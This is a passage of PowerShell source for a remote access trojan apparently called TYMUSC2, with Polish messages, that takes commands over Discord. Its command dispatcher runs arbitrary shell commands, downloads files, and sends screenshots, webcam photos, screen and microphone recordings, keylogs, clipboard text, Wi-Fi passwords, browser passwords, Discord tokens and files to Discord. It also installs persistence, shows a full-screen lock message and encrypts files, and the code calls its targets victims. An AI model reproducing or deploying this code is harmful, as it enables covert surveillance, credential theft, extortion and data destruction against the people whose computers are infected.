            foreach ($f in $files) {
                # Szukaj patternu w nazwie lub zawartosci
                if ($f.Name -match $Pattern) {
                    $results += $f.FullName
                    if ($results.Count -ge 50) { break }
                } elseif ($f.Length -lt 1MB) {
                    try {
                        $content = Get-Content $f.FullName -First 10 -ErrorAction SilentlyContinue
                        if ($content -match $Pattern) {
                            $results += $f.FullName
                            if ($results.Count -ge 50) { break }
                        }
                    } catch {}
                }
            }
        } catch {}
        if ($results.Count -ge 50) { break }
    }
    
    return $results
}

function Set-Wallpaper {
    param([string]$ImagePath)
    
    if (-not (Test-Path $ImagePath)) { return "Plik nie istnieje" }
    
    Add-Type @"
using System;
using System.Runtime.InteropServices;
using Microsoft.Win32;
public class Wallpaper {
    [DllImport("user32.dll", CharSet = CharSet.Auto)]
    public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
    public static void Set(string path) {
        SystemParametersInfo(20, 0, path, 3);
    }
}
"@
    
    try {
        [Wallpaper]::Set($ImagePath)
        return "Tapeta zmieniona na $ImagePath"
    } catch {
        return "Blad zmiany tapety: $_"
    }
}

function Encrypt-File {
    param([string]$FilePath)
    
    if (-not (Test-Path $FilePath)) { return $null }
    
    try {
        $content = [System.IO.File]::ReadAllBytes($FilePath)
        $salt = [System.Text.Encoding]::UTF8.GetBytes("TYMUSC2_SALT")
        $password = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
        
        $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        $key = $deriveBytes.GetBytes(32)
        $iv = $deriveBytes.GetBytes(16)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $encryptor = $aes.CreateEncryptor()
        $encrypted = $encryptor.TransformFinalBlock($content, 0, $content.Length)
        
        $outputPath = $FilePath + ".tymushacker"
        [System.IO.File]::WriteAllBytes($outputPath, $salt + $iv + $encrypted)
        
        return $outputPath
    } catch {
        return $null
    }
}

function Decrypt-File {
    param([string]$FilePath)
    
    if (-not (Test-Path $FilePath)) { return $null }
    
    try {
        $data = [System.IO.File]::ReadAllBytes($FilePath)
        $salt = $data[0..15]
        $iv = $data[16..31]
        $encrypted = $data[32..($data.Length - 1)]
        
        $password = [System.Text.Encoding]::UTF8.GetBytes($encryptionKey)
        $deriveBytes = New-Object System.Security.Cryptography.Rfc2898DeriveBytes($password, $salt, 10000, [System.Security.Cryptography.HashAlgorithmName]::SHA256)
        $key = $deriveBytes.GetBytes(32)
        
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $key
        $aes.IV = $iv
        $aes.Mode = [System.Security.Cryptography.CipherMode]::CBC
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        
        $decryptor = $aes.CreateDecryptor()
        $decrypted = $decryptor.TransformFinalBlock($encrypted, 0, $encrypted.Length)
        
        $outputPath = $FilePath -replace '\.tymushacker$', '.decrypted'
        [System.IO.File]::WriteAllBytes($outputPath, $decrypted)
        
        return $outputPath
    } catch {
        return $null
    }
}

function Execute-Command {
    param([string]$Command)
    
    $response = ""
    
    switch -Regex ($Command) {
        '^!info$' {
            $info = Get-ComprehensiveInfo
            $response = "FULL INFO - $($info.ComputerName)"
            $response += "`nUser: $($info.Username)@$($info.Domain)"
            $response += "`nOS: $($info.OS) ($($info.Architecture))"
            $response += "`nVersion: $($info.OSVersion)"
            $response += "`nSerial: $($info.SerialNumber)"
            $response += "`nPublic IP: $($info.PublicIP)"
            $response += "`nLocation: $($info.Location)"
            $response += "`nISP: $($info.ISP)"
            $response += "`nTimezone: $($info.Timezone)"
            $response += "`nCPU: $($info.CPU)"
            $response += "`nCPU Load: $($info.CPU_Load)%"
            $response += "`nRAM: $($info.RAM_GB) GB"
            $response += "`nGPU: $($info.GPU)"
            $response += "`nManufacturer: $($info.Manufacturer) $($info.Model)"
            
            if ($info.Disks) {
                foreach ($d in $info.Disks) {
                    $response += "`nDisk $($d.Drive): $($d.FreeGB)/$($d.TotalGB) GB ($($d.UsedPct)% used)"
                }
            }
            
            $response += "`nLocal IPs: $($info.LocalIPs)"
            $response += "`nMAC: $($info.MAC)"
            if ($info.Adapters) {
                foreach ($a in $info.Adapters) {
                    $response += "`nAdapter: $($a.Name) - $($a.IP) - $($a.Speed) Mbps"
                }
            }
            
            $response += "`nProcesses: $($info.ProcessCount)"
            $response += "`nUptime: $($info.Uptime)"
            $response += "`nLast Boot: $($info.LastBoot)"
            $response += "`nInstall Date: $($info.InstallDate)"
            
            if ($info.BatteryPct) { $response += "`nBattery: $($info.BatteryPct)% ($($info.BatteryStatus))" }
            if ($info.Antivirus) { $response += "`nAntivirus: $($info.Antivirus)" }
            $response += "`nFirewall: $($info.Firewall)"
            $response += "`nCulture: $($info.Culture)"
        }
        '^!sysinfo$' {
            $info = Get-ComprehensiveInfo
            $response = "SYSINFO - $($info.ComputerName)"
            $response += "`nCPU: $($info.CPU)"
            $response += "`nRAM: $($info.RAM_GB) GB"
            $response += "`nOS: $($info.OS)"
            if ($info.Disks) {
                foreach ($d in $info.Disks) { $response += "`n$($d.Drive): $($d.FreeGB)/$($d.TotalGB) GB" }
            }
        }
        '^!ip$' {
            $info = Get-ComprehensiveInfo
            $response = "IP: $($info.PublicIP)"
            $response += "`nLocation: $($info.Location)"
            $response += "`nISP: $($info.ISP)"
            $response += "`nCoords: $($info.Lat), $($info.Lon)"
            $response += "`nTimezone: $($info.Timezone)"
            $response += "`nAS: $($info.AS)"
        }
        '^!screenshot$|^!ss$' {
            $path = Take-Screenshot
            Send-DiscordMessage -Content "SCREENSHOT - $victimName" -File $path
            Remove-Item $path -Force
            $response = "Screenshot wyslany!"
        }
        '^!screenshot_all$|^!ssall$' {
            $path = Take-AllScreenshots
            Send-DiscordMessage -Content "SCREENSHOTS ALL MONITORS - $victimName" -File $path
            Remove-Item $path -Force -ErrorAction SilentlyContinue
            $response = "Screenshots wszystkich monitorow wyslane!"
        }
        '^!webcam$|^!cam$' {
            try {
                $folder = "$env:TEMP\cam_capture"
                if (-not (Test-Path $folder)) { New-Item -ItemType Directory -Path $folder -Force | Out-Null }
                
                $comObj = New-Object -ComObject WIA.ImageFile -ErrorAction SilentlyContinue
                if ($comObj) {
                    $deviceManager = New-Object -ComObject WIA.DeviceManager
                    $device = $deviceManager.DeviceInfos | Where-Object {$_.Type -eq 2} | Select-Object -First 1
                    if ($device) {
                        $deviceInfo = $device.Connect()
                        $item = $deviceInfo.ExecuteCommand("{E813C0C4-C8A8-4F7A-9E6D-6A8BDE81A9B1}")
                        $path = "$folder\webcam_$([DateTime]::Now.Ticks).jpg"
                        $item.Transfer().SaveFile($path)
                        Send-DiscordMessage -Content "WEBCAM - $victimName" -File $path
                        Remove-Item $path -Force
                        Remove-Item $folder -Force -ErrorAction SilentlyContinue
                        $response = "Zdjecie z kamery wyslane!"
                    } else {
                        $response = "Brak kamery"
                    }
                } else {
                    $response = "Brak dostepu do kamery (WIA)"
                }
            } catch {
                $response = "Blad kamery: $($_.Exception.Message)"
            }
        }
        '^!startrecord$|^!record$' {
            $recFile = Start-Recording
            Set-Content -Path "$dataDir\current_recording.txt" -Value $recFile
            $response = "Nagrywanie ekranu ROZPOCZETE! Uzyj !stoprecord aby zakonczyc"
        }
        '^!stoprecord$|^!stop$' {
            $recFile = Get-Content "$dataDir\current_recording.txt" -ErrorAction SilentlyContinue
            if ($recFile) {
                $zipPath = Stop-Recording -RecordingFile $recFile
                if ($zipPath -and (Test-Path $zipPath)) {
                    $size = [math]::Round((Get-Item $zipPath).Length/1MB,2)
                    Send-DiscordMessage -Content "NAGRANIE - $victimName ($size MB)" -File $zipPath
                    Remove-Item $zipPath -Force
                    Remove-Item "$dataDir\current_recording.txt" -Force -ErrorAction SilentlyContinue
                    $response = "Nagranie wyslane na Discorda!"
                } else {
                    $response = "Blad nagrywania"
                }
            } else {
                $response = "Brak aktywnego nagrywania"
            }
        }
        '^!shell (.+)$' {
            $cmd = $matches[1]
            try {
                $output = Invoke-Expression -Command $cmd 2>&1 | Out-String
                if ($output.Length -gt 1900) {
                    $output = $output.Substring(0, 1900) + "...[PRZYCIETO]"
                }
                $response = "CMD: `$ $cmd`n```$output```"
            } catch {
                $response = "Blad: $($_.Exception.Message)"
            }
        }
        '^!ps$|^!processes$' {
            $procs = Get-Process | Sort-Object CPU -Descending | Select-Object -First 25
            $response = "TOP 25 PROCESOW:`n"
            foreach ($p in $procs) {
                $response += "$($p.ProcessName) (PID: $($p.Id)) - CPU: $([math]::Round($p.CPU,1)) - RAM: $([math]::Round($p.WorkingSet/1MB,1)) MB`n"
            }
        }
        '^!kill (\d+)$' {
            $pid = [int]$matches[1]
            try {
                $process = Get-Process -Id $pid -ErrorAction Stop
                $name = $process.ProcessName
                Stop-Process -Id $pid -Force
                $response = "Proces $name (PID $pid) zakonczony"
            } catch {
                $response = "Nie udalo sie zabic procesu: $($_.Exception.Message)"
            }
        }
        '^!shutdown$' {
            $response = "WYLACZANIE SYSTEMU ZA 10 SEKUND..."
            Send-DiscordMessage -Content $response
            Start-Sleep -Seconds 10
            Stop-Computer -Force
            return
        }
        '^!restart$' {
            $response = "RESTART SYSTEMU ZA 10 SEKUND..."
            Send-DiscordMessage -Content $response
            Start-Sleep -Seconds 10
            Restart-Computer -Force
            return
        }
        '^!msg (.+)$' {
            $msg = $matches[1]
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($msg, "UWAGA!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Warning) | Out-Null
            $response = "MessageBox wyslany: $msg"
        }
        '^!speak (.+)$' {
            $text = $matches[1]
            try {
                Add-Type -AssemblyName System.Speech
                $speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
                $speech.Speak($text)
                $response = "Powiedziano: $text"
            } catch {
                $response = "Blad mowy: $($_.Exception.Message)"
            }
        }
        '^!voice (.+)$' {
            $text = $matches[1]
            try {
                Add-Type -AssemblyName System.Speech
                $speech = New-Object System.Speech.Synthesis.SpeechSynthesizer
                $speech.Rate = -2
                $speech.Volume = 100
                
                # Probuj po polsku
                try {
                    $polishVoice = $speech.GetInstalledVoices() | Where-Object { $_.VoiceInfo.Name -match 'Polish|polski|MS-PL' } | Select-Object -First 1
                    if ($polishVoice) { $speech.SelectVoice($polishVoice.VoiceInfo.Name) }
                } catch {}
                
                $speech.Speak($text)
                $response = "Glos: $text"
            } catch {
                $response = "Blad mowy: $($_.Exception.Message)"
            }
        }
        '^!download (.+)$' {
            $url = $matches[1]
            $fileName = [System.IO.Path]::GetFileName($url)
            if (-not $fileName) { $fileName = "download_$([DateTime]::Now.Ticks).exe" }
            $savePath = "$env:TEMP\$fileName"
            try {
                # Probuj Invoke-WebRequest, jesli nie dziala to WebClient
                try {
                    Invoke-WebRequest -Uri $url -OutFile $savePath -ErrorAction Stop
                } catch {
                    $wc = New-Object System.Net.WebClient
                    $wc.DownloadFile($url, $savePath)
                }
                $size = [math]::Round((Get-Item $savePath).Length/1KB,1)
                $response = "Pobrano: $fileName ($size KB)"
            } catch {
                $response = "Blad pobierania: $($_.Exception.Message)"
            }
        }
        '^!upload (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
                $item = Get-Item $path
                $size = [math]::Round($item.Length/1KB,1)
                Send-DiscordMessage -Content "PLIK - $victimName - $($item.Name) ($size KB)" -File $path
                $response = "Plik wyslany na Discorda: $path"
            } else {
                $response = "Plik nie istnieje: $path"
            }
        }
        '^!grab (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
                $item = Get-Item $path
                if ($item.Length -le 8MB) {
                    $size = [math]::Round($item.Length/1KB,1)
                    Send-DiscordMessage -Content "GRAB - $victimName - $($item.Name) ($size KB)" -File $path
                    $response = "Plik wyslany: $path"
                } else {
                    # Spakuj jesli za duzy
                    $zipPath = "$env:TEMP\grab_$([DateTime]::Now.Ticks).zip"
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    [System.IO.Compression.ZipFile]::CreateFromDirectory((Get-Item $path).Directory.FullName, $zipPath, [System.IO.Compression.CompressionLevel]::Optimal, $false, "*$($item.Name)")
                    $size = [math]::Round((Get-Item $zipPath).Length/1MB,2)
                    Send-DiscordMessage -Content "GRAB ZIP - $victimName - $($item.Name) ($size MB)" -File $zipPath
                    Remove-Item $zipPath -Force -ErrorAction SilentlyContinue
                    $response = "Plik spakowany i wyslany: $path"
                }
            } else {
                $response = "Plik nie istnieje: $path"
            }
        }
        '^!clipboard$|^!cb$' {
            try {
                Add-Type -AssemblyName System.Windows.Forms
                $clip = [System.Windows.Forms.Clipboard]::GetText()
                if ($clip.Length -gt 1000) { $clip = $clip.Substring(0, 1000) + "..." }
                if ($clip.Length -gt 0) {
                    $response = "SCHOWEK:`n$clip"
                } else {
                    $response = "Schowek pusty"
                }
            } catch {
                $response = "Nie mozna odczytac schowka: $($_.Exception.Message)"
            }
        }
        '^!browse$|^!files$' {
            $dirs = Get-ChildItem -Path "C:\Users\$env:USERNAME" -Directory -ErrorAction SilentlyContinue
            $response = "KATALOGI UZYTKOWNIKA:`n"
            foreach ($d in $dirs) {
                $response += "$($d.Name)/`n"
            }
            $response += "`nUzyj !dir <sciezka> aby zobaczyc zawartosc"
        }
        '^!dir (.+)$' {
            $dir = $matches[1]
            if (Test-Path $dir) {
                $items = Get-ChildItem -Path $dir -ErrorAction SilentlyContinue | Select-Object -First 40
                if ($items) {
                    $response = "ZAWARTOSC: $dir`n"
                    foreach ($item in $items) {
                        if ($item.PSIsContainer) {
                            $response += "[DIR] $($item.Name)`n"
                        } else {
                            $response += "[FILE] $($item.Name) ($([math]::Round($item.Length/1KB,1)) KB)`n"
                        }
                    }
                    if ($items.Count -ge 40) { $response += "... (wiecej niz 40 pozycji)`n" }
                } else {
                    $response = "Katalog pusty: $dir"
                }
            } else {
                $response = "Katalog nie istnieje: $dir"
            }
        }
        '^!search (.+)$' {
            $pattern = $matches[1]
            $results = Search-Files -Pattern $pattern
            if ($results.Count -gt 0) {
                $response = "WYNIKI SZUKANIA: $pattern`n"
                foreach ($r in $results) {
                    $response += "$r`n"
                    if ($response.Length -gt 1800) {
                        $response += "... [PRZYCIETO - $($results.Count) wynikow]"
                        break
                    }
                }
            } else {
                $response = "Nie znaleziono plikow pasujacych do: $pattern"
            }
        }
        '^!keylog$|^!keys$' {
            $klPath = "$env:TEMP\keylog_$([DateTime]::Now.Ticks).txt"
            Set-Content -Path $klPath -Value "KEYLOGGER STARTED: $(Get-Date)"
            
            $klScript = @'
Add-Type @"
using System;
using System.Runtime.InteropServices;
public class K {
    [DllImport("user32.dll")]
    public static extern int GetAsyncKeyState(Int32 i);
}
"@
$logFile = $args[0]
$clipFile = $args[1]
$lastClip = ""
while($true) {
    for($i=1; $i -le 255; $i++) {
        $state = [K]::GetAsyncKeyState($i)
        if ($state -eq -32767) {
            $key = [char]$i
            Add-Content -Path $logFile -Value ("[KEY " + (Get-Date -Format "HH:mm:ss.fff") + "] " + $key)
        }
    }
    # Sprawdzaj schowek co 2 sek
    Start-Sleep -Milliseconds 10
    if ((Get-Date).Second % 2 -eq 0) {
        try {
            Add-Type -AssemblyName System.Windows.Forms -ErrorAction SilentlyContinue
            $clip = [System.Windows.Forms.Clipboard]::GetText()
            if ($clip -and $clip -ne $lastClip -and $clip.Length -gt 3) {
                $lastClip = $clip
                Add-Content -Path $clipFile -Value ("[CLIP " + (Get-Date -Format "HH:mm:ss") + "] " + $clip.Substring(0, [Math]::Min($clip.Length, 200)))
            }
        } catch {}
    }
}
'@
            Set-Content -Path "$env:TEMP\keylogger_runner.ps1" -Value $klScript
            
            $clipPath = "$env:TEMP\keylog_clips_$([DateTime]::Now.Ticks).txt"
            Start-Process -FilePath "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\keylogger_runner.ps1`" `"$klPath`" `"$clipPath`"" -WindowStyle Hidden
            
            Set-Content -Path "$dataDir\keylog_file.txt" -Value $klPath
            Set-Content -Path "$dataDir\keylog_clip_file.txt" -Value $clipPath
            $response = "Keylogger URUCHOMIONY! Uzyj !getkeylog aby pobrac logi"
        }
'^!getkeylog$|^!getkeys$' {
            $klFile = Get-Content "$dataDir\keylog_file.txt" -ErrorAction SilentlyContinue
            $clipFile = Get-Content "$dataDir\keylog_clip_file.txt" -ErrorAction SilentlyContinue
            
            $response = ""
            
            if ($klFile -and (Test-Path $klFile)) {
                $content = Get-Content $klFile -Tail 100
                if ($content) {
                    $log = $content -join "`n"
                    if ($log.Length -gt 1500) { $log = $log.Substring(0, 1500) + "... [przycieto]" }
                    $response += "KEYLOG (ostatnie 100 wpisow):`n```$log```"
                }
            }
            
            if ($clipFile -and (Test-Path $clipFile)) {
                $clipContent = Get-Content $clipFile -Tail 20
                if ($clipContent) {
                    $response += "`nSCHOWEK (ostatnie 20):`n"
                    foreach ($c in $clipContent) { $response += "$c`n" }
                }
            }
            
            if (-not $response) { $response = "Brak logow keyloggera. Uzyj najpierw !keylog" }
        }
        '^!lock$|^!block$' {
            $scriptBlock = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing
$f = New-Object System.Windows.Forms.Form
$f.WindowState = "Maximized"
$f.FormBorderStyle = "None"
$f.TopMost = $true
$f.BackColor = "Black"
$f.KeyPreview = $true
$f.KeyDown += { param($s,$e) $e.SuppressKeyPress=$true; $e.Handled=$true }
$l = New-Object System.Windows.Forms.Label
$l.Text = "SYSTEM ZABLOKOWANY PRZEZ TYMUSHACKER`n`nTen komputer zostal zdalnie przejety`n`nNie probuj wychodzic - to niemozliwe"
$l.Font = New-Object System.Drawing.Font("Consolas", 20, [System.Drawing.FontStyle]::Bold)
$l.ForeColor = "Red"
$l.BackColor = "Black"
$l.TextAlign = "MiddleCenter"
$l.Size = New-Object System.Drawing.Size(1920, 1080)
$l.Location = New-Object System.Drawing.Point(0, 0)
$f.Controls.Add($l)
$t = New-Object System.Windows.Forms.Timer
$t.Interval = 50
$t.Add_Tick({ $f.TopMost = $true })
$t.Start()
[System.Windows.Forms.Application]::Run($f)
'@
            Set-Content -Path "$env:TEMP\tymushacker_lock.ps1" -Value $scriptBlock
            Start-Process -FilePath "powershell" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$env:TEMP\tymushacker_lock.ps1`"" -WindowStyle Hidden
            $response = "SYSTEM ZABLOKOWANY! Uzyj !unlock aby odblokowac"
        }
        '^!unlock$' {
            try {
                Get-Process | Where-Object { $_.ProcessName -eq 'powershell' -and $_.MainWindowTitle -eq '' } | Stop-Process -Force -ErrorAction SilentlyContinue
                $response = "Proba odblokowania systemu"
            } catch {
                $response = "Nie udalo sie odblokowac"
            }
        }
        '^!open (.+)$' {
            $path = $matches[1]
            try {
                Start-Process $path
                $response = "Otwarto: $path"
            } catch {
                $response = "Nie mozna otworzyc: $($_.Exception.Message)"
            }
        }
        '^!chrome$' {
            try {
                Start-Process "chrome" -ArgumentList "--new-window https://www.youtube.com/watch?v=dQw4w9WgXcQ" -ErrorAction SilentlyContinue
                $response = "Chrome uruchomiony"
            } catch {
                $response = "Nie mozna uruchomic Chrome"
            }
        }
        '^!type (.+)$' {
            $text = $matches[1]
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.SendKeys]::SendWait($text)
            $response = "Wpisano: $text"
        }
        '^!alert (.+)$' {
            $text = $matches[1]
            Add-Type -AssemblyName System.Windows.Forms
            [System.Windows.Forms.MessageBox]::Show($text, "ALERT!", [System.Windows.Forms.MessageBoxButtons]::OK, [System.Windows.Forms.MessageBoxIcon]::Error) | Out-Null
            $response = "Alert wyslany"
        }
        '^!wifi$' {
            $networks = Get-WiFiPasswords
            if ($networks.Count -gt 0) {
                $response = "ZAPISANE SIECI WiFi ($($networks.Count)):`n"
                foreach ($n in $networks) {
                    $response += "$($n.Profile) | Haslo: $($n.Password) | Auth: $($n.Auth)`n"
                    if ($response.Length -gt 1800) { $response += "... [przycieto]`n"; break }
                }
            } else {
                $response = "Nie znaleziono zapisanych sieci WiFi lub brak uprawnien"
            }
        }
        '^!passwords$|^!pass$' {
            $browsers = Get-BrowserPasswords
            if ($browsers.Count -gt 0) {
                $response = "ZAPISANE HASLA ($($browsers.Count)):`n"
                foreach ($b in $browsers) {
                    $response += "[$($b.Browser)] $($b.URL) | User: $($b.Username) | Haslo: $($b.Password)`n"
                    if ($response.Length -gt 1800) { $response += "... [przycieto - $($browsers.Count) wynikow]`n"; break }
                }
                $response += "`nNiektore hasla moga byc zaszyfrowane (Chrome <80/AES-GCM)"
            } else {
                $response = "Nie znaleziono hasel w przegladarkach"
            }
        }
        '^!browsers$|^!tokens$' {
            $cookies = Get-BrowserCookies
            $discord = Get-DiscordTokens
            
            $response = "DISCORD TOKENY:`n"
            if ($discord.Count -gt 0) {
                foreach ($t in $discord) {
                    $response += "Token: $($t.Token)`n"
                }
            } else {
                $response += "Nie znaleziono tokenow Discord`n"
            }
            
            $response += "`nCIasteczka przegladarek (Discord/Google/GitHub):`n"
            if ($cookies.Count -gt 0) {
                foreach ($c in $cookies) {
                    $response += "$($c.Host) -> $($c.Name)`n"
                }
            } else {
                $response += "Nie znaleziono ciasteczek"
            }
        }
        '^!persist$|^!install$' {
            $result = Persist-Script
            $response = "PERSISTENCJA ZAINSTALOWANA:`n"
            $response += "Startup PS1: $($result.StartupPS1)`n"
            $response += "Startup BAT: $($result.StartupBAT)`n"
            $response += "Startup VBS: $($result.StartupVBS)`n"
            $response += "Registry: $($result.Registry)`n"
            $response += "Task Scheduler: $($result.ScheduledTask)"
        }
        '^!clean$|^!remove$' {
            $response = Remove-Persistence
        }
        '^!elevate$|^!admin$' {
            $response = Elevate-ToAdmin
        }
        '^!mic$|^!recordmic$' {
            $result = Start-MicRecording
            if ($result) {
                $response = "Nagrywanie mikrofonu ROZPOCZETE! Uzyj !stopmic aby zakonczyc"
            } else {
                $response = "Blad uruchamiania nagrywania mikrofonu (moze wymagac admina)"
            }
        }
        '^!stopmic$' {
            $result = Stop-MicRecording
            if ($result -and (Test-Path $result)) {
                $size = [math]::Round((Get-Item $result).Length/1KB,1)
                Send-DiscordMessage -Content "NAGRANIE MIKROFONU - $victimName ($size KB)" -File $result
                Remove-Item $result -Force -ErrorAction SilentlyContinue
                $response = "Nagranie z mikrofonu wyslane!"
            } else {
                $response = "Brak aktywnego nagrywania mikrofonu"
            }
        }
        '^!netstat$' {
            $connections = Get-NetworkInfo
            if ($connections.Count -gt 0) {
                $response = "POLACZENIA TCP (pierwsze 30):`n"
                foreach ($c in $connections) {
                    $response += "$($c.Process) | $($c.Local) -> $($c.Remote) | $($c.State)`n"
                }
            } else {
                $response = "Brak aktywnych polaczen lub brak uprawnien"
            }
        }
        '^!arp$' {
            $arp = Get-ARPTable
            if ($arp.Count -gt 0) {
                $response = "TABELA ARP:`n"
                foreach ($a in $arp) {
                    $response += "$($a.IP) -> $($a.MAC)`n"
                }
            } else {
                $response = "Blad pobierania tablicy ARP"
            }
        }
        '^!users$|^!sessions$' {
            $users = Get-ActiveUsers
            if ($users.Count -gt 0) {
                $response = "AKTYWNI UZYTKOWNICY:`n"
                foreach ($u in $users) {
                    $response += "$($u.Username) | $($u.Session) | ID: $($u.ID) | $($u.State) | Idle: $($u.IdleTime)`n"
                }
            } else {
                $response = "Tylko obecny uzytkownik lub brak uprawnien"
            }
        }
        '^!services$' {
            $services = Get-SystemServices
            if ($services.Count -gt 0) {
                $response = "URUCHOMIONE USLUGI (pierwsze 30):`n"
                foreach ($s in $services) {
                    $response += "$($s.Name) | $($s.StartType)`n"
                }
            } else {
                $response = "Blad pobierania listy uslug"
            }
        }
        '^!uptime$' {
            $info = Get-ComprehensiveInfo
            $response = "UPTIME: $($info.Uptime)`nLast Boot: $($info.LastBoot)"
        }
        '^!idle$' {
            try {
                Add-Type @"
using System;
using System.Runtime.InteropServices;
public class IdleTime {
    [DllImport("user32.dll")]
    static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
    internal struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
    public static uint GetIdle() {
        LASTINPUTInfo lastInfo = new LASTINPUTInfo();
        lastInfo.cbSize = (uint)Marshal.SizeOf(lastInfo);
        GetLastInputInfo(ref lastInfo);
        return (uint)Environment.TickCount - lastInfo.dwTime;
    }
}
"@
                $idle = [IdleTime]::GetIdle() / 1000
                $response = "Czas bezczynnosci: $idle sekund"
            } catch {
                $response = "Blad pomiaru czasu bezczynnosci"
            }
        }
        '^!wallpaper (.+)$' {
            $path = $matches[1]
            $response = Set-Wallpaper -ImagePath $path
        }
        '^!vol (.+)$' {
            $level = $matches[1]
            try {
                Add-Type -AssemblyName System.Windows.Forms
                $vol = [Math]::Min([Math]::Max([int]$level, 0), 100)
                $wsh = New-Object -ComObject WScript.Shell
                for ($i = 0; $i -lt 50; $i++) { $wsh.SendKeys([char]174) }
                for ($i = 0; $i -lt [Math]::Floor($vol/2); $i++) { $wsh.SendKeys([char]175) }
                $response = "Glosnosc ustawiona na ~$vol%"
            } catch {
                $response = "Blad zmiany glosnosci"
            }
        }
        '^!mute$' {
            try {
                $wsh = New-Object -ComObject WScript.Shell
                $wsh.SendKeys([char]173)
                $response = "Wylaczono dzwiek (mute toggle)"
            } catch {
                $response = "Blad"
            }
        }
        '^!bright (.+)$' {
            $level = [Math]::Min([Math]::Max([int]$matches[1], 0), 100)
            try {
                $monitor = Get-CimInstance -Namespace root/WMI -ClassName WmiMonitorBrightnessMethods -ErrorAction SilentlyContinue
                if ($monitor) {
                    $monitor.WmiSetBrightness($level, 0) | Out-Null
                    $response = "Jasnosc ustawiona na $level%"
                } else {
                    $response = "Brak obslugi jasnosci przez WMI"
                }
            } catch {
                $response = "Blad zmiany jasnosci: $($_.Exception.Message)"
            }
        }
        '^!hide$' {
            try {
                $consolePtr = [Console.Window]::GetConsoleWindow()
                [Console.Window]::ShowWindow($consolePtr, 0) | Out-Null
                $response = "Konsola ukryta"
                Send-DiscordMessage -Content $response
                return
            } catch {
                $response = "Blad ukrywania konsoli"
            }
        }
        '^!min$' {
            try {
                $consolePtr = [Console.Window]::GetConsoleWindow()
                [Console.Window]::ShowWindow($consolePtr, 6) | Out-Null  # SW_MINIMIZE
                $response = "Konsola zminimalizowana"
            } catch {
                $response = "Blad"
            }
        }
        '^!max$' {
            try {
                $consolePtr = [Console.Window]::GetConsoleWindow()
                [Console.Window]::ShowWindow($consolePtr, 3) | Out-Null  # SW_MAXIMIZE
                $response = "Konsola zmaksymalizowana"
            } catch {
                $response = "Blad"
            }
        }
        '^!move (\d+) (\d+)$' {
            $x = [int]$matches[1]
            $y = [int]$matches[2]
            try {
                $consolePtr = [Console.Window]::GetConsoleWindow()
                Add-Type @"
using System;
using System.Runtime.InteropServices;
public class WinMove {
    [DllImport("user32.dll")] public static extern bool SetWindowPos(IntPtr hWnd, IntPtr hWndInsertAfter, int X, int Y, int cx, int cy, uint uFlags);
}
"@
                [WinMove]::SetWindowPos($consolePtr, [IntPtr]::Zero, $x, $y, 0, 0, 0x0001) | Out-Null
                $response = "Okno przesuniete na ($x, $y)"
            } catch {
                $response = "Blad"
            }
        }
        '^!key$' {
            # Wyslij informacje o produkt key Windows
            try {
                $key = (Get-WmiObject SoftwareLicensingService).OA3xOriginalProductKey
                if ($key) {
                    $response = "Klucz Windows: $key"
                } else {
                    $response = "Nie znaleziono klucza produktu (OA3)"
                }
            } catch {
                $response = "Blad odczytu klucza Windows"
            }
        }
        '^!exit$|^!quit$' {
            $response = "Wylaczanie TYMUSC2..."
            Send-DiscordMessage -Content "TYMUSC2 WYLACZONY - $victimName"
            exit
        }
        '^!clear$' {
            # Wyczysc logi i slady
            $paths = @(
                "$env:TEMP\tymushacker_data",
                "$env:TEMP\keylogger_runner.ps1",
                "$env:TEMP\tymushacker_lock.ps1",
                "$env:TEMP\tymushacker_recording",
                "$env:TEMP\cam_capture",
                "$env:TEMP\tymushacker_audio",
                "$dataDir"
            )
            foreach ($p in $paths) {
                Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue
            }
            $response = "Wyczyszczono slady dzialania TYMUSC2"
        }
        '^!crypt (.+)$' {
            $path = $matches[1]
            $encrypted = Encrypt-File -FilePath $path
            if ($encrypted) {
                $response = "Plik zaszyfrowany: $encrypted"
            } else {
                $response = "Blad szyfrowania pliku: $path"
            }
        }
        '^!decrypt (.+)$' {
            $path = $matches[1]
            $decrypted = Decrypt-File -FilePath $path
            if ($decrypted) {
                $response = "Plik odszyfrowany: $decrypted"
            } else {
                $response = "Blad deszyfrowania pliku: $path"
            }
        }
        '^!zip (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
                $zipPath = "$env:TEMP\zipped_$([DateTime]::Now.Ticks).zip"
                Add-Type -AssemblyName System.IO.Compression.FileSystem
                if ((Get-Item $path).PSIsContainer) {
                    [System.IO.Compression.ZipFile]::CreateFromDirectory($path, $zipPath)
                } else {
                    $zip = [System.IO.Compression.ZipFile]::Open($zipPath, [System.IO.Compression.ZipArchiveMode]::Create)
                    [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zip, $path, [System.IO.Path]::GetFileName($path)) | Out-Null
                    $zip.Dispose()
                }
                $size = [math]::Round((Get-Item $zipPath).Length/1KB,1)
                $response = "Spakowano do: $zipPath ($size KB)"
            } else {
                $response = "Plik nie istnieje: $path"
            }
        }
        '^!unzip (.+)$' {
            $path = $matches[1]
            if (Test-Path $path) {
